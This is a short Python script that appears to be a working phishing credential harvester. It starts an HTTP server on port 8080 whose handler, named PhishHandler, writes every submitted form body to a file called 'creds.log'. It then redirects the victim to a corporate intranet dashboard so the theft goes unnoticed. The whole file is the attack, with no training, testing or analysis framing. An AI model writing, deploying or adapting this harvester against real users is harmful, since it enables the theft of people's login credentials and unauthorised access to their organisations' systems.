import http.server
import urllib.parse
class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode('utf-8')
        with open('creds.log', 'a') as f:
            f.write(post_data + '\n')
        self.send_response(302)
        self.send_header('Location', 'https://intranet.corp.example.com/dashboard')
        self.end_headers()

http.server.HTTPServer(('0.0.0.0', 8080), PhishHandler).serve_forever()
